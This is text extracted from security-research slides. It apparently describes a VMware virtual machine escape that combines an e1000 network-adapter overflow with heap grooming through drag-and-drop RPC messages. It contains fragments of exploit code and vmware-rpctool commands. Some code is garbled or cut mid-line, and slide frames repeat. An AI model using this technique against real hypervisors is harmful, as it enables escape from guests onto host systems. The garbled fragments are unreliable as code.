//TCP checsum end
uint32_t cmd_and_length;
uint8_t status;
//Descriptor status
uint8_t hdr_len;
//Header length
uint16_t mss;
//Maximum segment 
size
}prop_desc;
}tranfer;
ipcss is only one byte!  
How far can we overwrite？
void __usercall e1000_init_packet(...) {
  ...
    ...
  cur_buffer = packet;
  transfer_pay_size = pay_size;
  while(idx cmd = 0x1f|(1hdr_len=0x30;
  desc->mss = 0x10;
  desc->ipcss = offset-0xa-0x4-((desc->hdr_len+desc->mss+0x11)&0xfffffff8);
  //create second packet to send ipv6 GSO packet
  data = (struct data_desc *)&packet[2];
  data->len = 0x800|(1”
Before we start
●
Example
f1yyy@ubuntu:~/vmware-rpctool “dnd.transport ”
DnDTrasnferPacketHeader{
uint32_t type; 
uint32_t seqNum;
uint32_t totalSize;
uint32_t payloadSize;
uin32_t offset;
char data[1]
}
mRecvBuffer{
Uint64_t seqNum=0; 
void * buffer=NULL;
uint64_t totalSize=0;
uint64_t offset=0;
. . .
}
Before we start
●
Example
f1yyy@ubuntu:~/vmware-rpctool “dnd.transport ”
DnDTrasnferPacketHeader{
uint32_t type=3; 
uint32_t seqNum=0;
uint32_t totalSize=0xa8;
uint32_t payloadSize=0x10;
uin32_t offset=0;
char data[1]
}
mRecvBuffer{
Uint64_t seqNum=0; 
void * buffer=NULL;
uint64_t totalSize=0;
uint64_t offset=0;
. . .
}
Before we start
●
Example
f1yyy@ubuntu:~/vmware-rpctool “dnd.transport ”
DnDTrasnferPacketHeader{
uint32_t type=3; 
uint32_t seqNum=0;
uint32_t totalSize=0xa8;
uint32_t payloadSize=0x10;
uin32_t offset=0;
char data[1]
}
mRecvBuffer{
Uint64_t seqNum=0; 
void * buffer=NULL;
uint64_t totalSize=0;
uint64_t offset=0;
. . .
}
Transfer 0x10 data
Before we start
●
Example
f1yyy@ubuntu:~/vmware-rpctool “dnd.transport ”
DnDTrasnferPacketHeader{
uint32_t type=3; 
uint32_t seqNum=0;
uint32_t totalSize=0xa8;
uint32_t payloadSize=0x10;
uin32_t offset=0;
char data[1]
}
mRecvBuffer{
Uint64_t seqNum=0; 
void * buffer=malloc(0xa8);
uint64_t totalSize=0xa8;
uint64_t offset=0x10;
. . .
}
Transfer 0x10 data
Before we start
●
Example
f1yyy@ubuntu:~/vmware-rpctool “dnd.transport ”
DnDTrasnferPacketHeader{
uint32_t type=3; 
uint32_t seqNum=0;
uint32_t totalSize=0xa8;
uint32_t payloadSize=0x10;
uin32_t offset=0x10;
char data[1]
}
mRecvBuffer{
Uint64_t seqNum=0; 
void * buffer=malloc(0xa8);
uint64_t totalSize=0xa8;
uint64_t offset=0x10;
. . .
}
Transfer another 0x10 data
Before we start
●
Example
f1yyy@ubuntu:~/vmware-rpctool “dnd.transport ”
DnDTrasnferPacketHeader{
uint32_t type=3; 
uint32_t seqNum=0;
uint32_t totalSize=0xa8;
uint32_t payloadSize=0x10;
uin32_t offset=0x10;
char data[1]
}
mRecvBuffer{
Uint64_t seqNum=0; 
void * buffer=malloc(0xa8);
uint64_t totalSize=0xa8;
uint64_t offset=0x20;
. . .
}
Transfer another 0x10 data
Exploit
●
For Windows Low Fragmented Heap, chunk of size 0xa8 will be allocated in the 
same bucket and in a contiguous address space.
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Exploit
●
Allocate DnD structure
○
tools.capability.dnd_version 3
○
vmx.capability.dnd_version
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Exploit
●
Allocate DnD structure
○
tools.capability.dnd_version 3
○
vmx.capability.dnd_version
Free
Free
Free
Free
Free
Free
Free
Free
DnD v3
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Exploit
●
Then initialize mRecvBuffer by using dnd.transport 
Free
Free
Free
Free
Free
Free
Free
Free
DnD v3
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
struct DnDTransportBuffer{
Uint64_t seqNum; 
void * buffer;
uint64_t totalSize;
uint64_t offset;
. . .
}mRecvBuf;
Free
Exploit
●
Then initialize mRecvBuffer by using dnd.transport 
Free
Free
Free
Free
Free
Free
Free
Free
DnD v3
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
struct DnDTransportBuffer{
Uint64_t seqNum; 
void * buffer=malloc(0xa0)
uint64_t totalSize=0xa0
uint64_t offset=0
. . .
}mRecvBuf;
Free
Exploit
●
Then initialize mRecvBuffer by using dnd.transport 
Free
DnD 
Buffer
Free
Free
Free
Free
Free
Free
DnD v3
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
struct DnDTransportBuffer{
Uint64_t seqNum; 
void * buffer=malloc(0xa0)
uint64_t totalSize=0xa0
uint64_t offset=0
. . .
}mRecvBuf;
Free
Free
Exploit
●
Now let’s try to overwrite the Totalsize of mRecvBuf
Free
DnD 
Buffer
Free
Free
Free
Free
Free
Free
DnD v3
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Free
Exploit
●
Now let’s try to overwrite the Totalsize of mRecvBuf 
○
e1000_overflow_write_size_0xa0(0x130)
Free
DnD 
Buffer
Free